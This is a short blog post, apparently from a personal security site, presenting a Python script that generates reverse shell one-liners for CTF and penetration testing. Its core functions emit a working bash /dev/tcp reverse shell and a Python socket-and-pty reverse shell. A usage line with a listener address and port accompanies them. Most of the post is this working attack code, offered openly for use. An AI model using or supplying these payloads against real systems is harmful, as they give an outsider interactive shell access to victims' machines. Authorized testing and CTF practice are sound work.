---
TitleSEO:    "Python Reverse Shell Script | ZureFX"
TitlePost:   "Python Reverse Shell Generator"
Author:      "ZureFX"
Description: "Lightweight Python script to generate reverse shell one-liners for multiple languages during CTF and pentesting."
Keywords:    "reverse shell, python, scripting, pentesting, ctf tools"
URL:         "https://zurefx.github.io/scripting/python-rev-shell.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/scripting/python-rev-shell/"
Date:        "2026-03-07"
Tags:        "Python, Scripting, ReverseShell, Tools"
Section:     "scripting"
Lang:        "en"
main_img:    "python-rev-shell"
Permalink:   "/scripting/python-rev-shell.html"
BtnLabel:    "View Script"
---

## Overview

A simple CLI tool that generates reverse shell payloads for bash, Python, Perl and PowerShell.

## Usage

```bash
python3 revgen.py --lhost 10.10.14.5 --lport 4444 --type bash
```

## Core Function

```python
def gen_bash(lhost, lport):
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

def gen_python(lhost, lport):
    return (
        f"python3 -c 'import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    )
```
